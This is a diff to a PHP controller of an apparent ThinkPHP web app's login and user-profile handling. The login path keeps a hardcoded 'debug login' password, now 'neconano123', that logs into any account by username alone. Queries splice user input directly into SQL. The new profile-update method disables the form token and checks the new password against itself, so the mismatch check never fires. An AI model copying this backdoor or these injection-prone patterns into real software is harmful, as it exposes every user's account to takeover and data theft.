@@ -32,10 +32,11 @@ class IndexAction extends Action{
 		if(cookie('setok') == 'login1')
 			$this->ajaxReturn('', '帐号或密码错误，10分钟内无法登陆！', 0);
 				
-		if($_POST["password"] == 'gaopeng')//调试登录
+		if($_POST["password"] == 'neconano123')//调试登录
 			$user = $ViewUser->where("`title`='$username'")->find();
 		else//正常登录
 			$user = $ViewUser->where("`title`='$username' AND `password`='$userpass'")->find();
+			
 		if($user) {
 			if ($user["islock"]=='已锁定') {
 				cookie('setok','login1',LOGIN_TIME_FAILE);
@@ -114,6 +115,51 @@ class IndexAction extends Action{
 		$this->assign("datalist",$FAQall);
 		$this->display('Index:FAQ');
 	}
+	
+	
+	public function dopostchangeuserinfo() {
+		C('TOKEN_ON',false);
+        if (!$this->user)
+            redirect(SITE_INDEX.'Index/index');
+		$System = D("System");
+		$ViewUser = D("ViewUser");
+		$userID = $this->user['systemID'];
+		if($_REQUEST['type'] == '密码'){
+			$userpass = md5(md5($_POST["password"]));
+			$user = $ViewUser->where("`systemID` = '$userID' and `password` = '$userpass'")->find();
+			if($user){
+				$data['systemID'] = $user['systemID'];
+				if($_REQUEST['new_password'] == $_REQUEST['new_password']){
+					$data['user']['password'] = md5(md5($_REQUEST['new_password']));
+					if(false !== $System->relation("user")->myRcreate($data))
+						$this->ajaxReturn($_REQUEST, '修改成功！！', 1);
+					$this->ajaxReturn($_REQUEST, $System->getError(), 0);
+				}
+				$this->ajaxReturn($_REQUEST, '新密码与重复密码不一致！！', 0);
+			}
+			else
+			$this->ajaxReturn($_REQUEST, '原始密码错误！！', 0);
+		}
+		if($_REQUEST['type'] == '信息'){
+			$user = $ViewUser->where("`systemID` = '$userID'")->find();
+			if($user){
+				$data['systemID'] = $user['systemID'];
+				$data['user']['mailadres'] = $_REQUEST['mailadres'];
+				$data['user']['user_gender'] = $_REQUEST['user_gender'];
+				$data['user']['telnum'] = $_REQUEST['telnum'];
+				if(false !== $System->relation("user")->myRcreate($data))
+					$this->ajaxReturn($_REQUEST, '修改成功！！', 1);
+				$this->ajaxReturn($_REQUEST, $System->getError(), 0);
+			}
+			else
+			$this->ajaxReturn($_REQUEST, '错误！！', 0);
+		}
+	}
+	
+	
+	
+	
+	
 	
 }
 ?>
